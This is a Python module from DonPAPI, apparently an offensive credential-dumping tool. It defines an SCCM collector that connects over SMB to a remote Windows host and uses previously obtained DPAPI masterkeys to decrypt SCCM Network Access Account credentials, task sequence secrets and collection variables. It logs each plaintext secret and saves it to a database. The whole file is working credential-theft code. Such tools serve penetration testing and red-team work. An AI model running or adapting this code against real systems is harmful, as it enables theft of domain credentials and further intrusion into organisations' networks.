from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.sccm import SCCMTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


TAG = "SCCM"

class SCCMDump:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context

    def run(self):
        if self.context.remoteops_allowed:
            self.logger.display("Dumping SCCM Credentials")
            for wmi in [False,True]:
                sccm_triage = SCCMTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, use_wmi=wmi)
                sccmcreds, sccmtasks, sccmcollections = sccm_triage.triage_sccm()
                for sccmcred in sccmcreds:
                    self.logger.secret(f"[NAA Account] {sccmcred.username.decode('latin-1')}:{sccmcred.password.decode('latin-1')}", TAG)
                    self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user="SYSTEM", username=sccmcred.username.decode('latin-1'), password=sccmcred.password.decode('latin-1'), program="NAA Account")
                for sccmtask in sccmtasks:
                    self.logger.secret(f"[Task sequences secret] {sccmtask.secret.decode('latin-1')}", TAG)
                    self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user="SYSTEM", password=sccmtask.secret.decode('latin-1'), program="Task sequences secret")
                for sccmcollection in sccmcollections:
                    self.logger.secret(f"[Collection Variable] {sccmcollection.variable.decode('latin-1')}:{sccmcollection.value.decode('latin-1')}", TAG)
                    self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user="SYSTEM", username=sccmcollection.variable.decode('latin-1'), password=sccmcollection.value.decode('latin-1'), program="Collection Variable")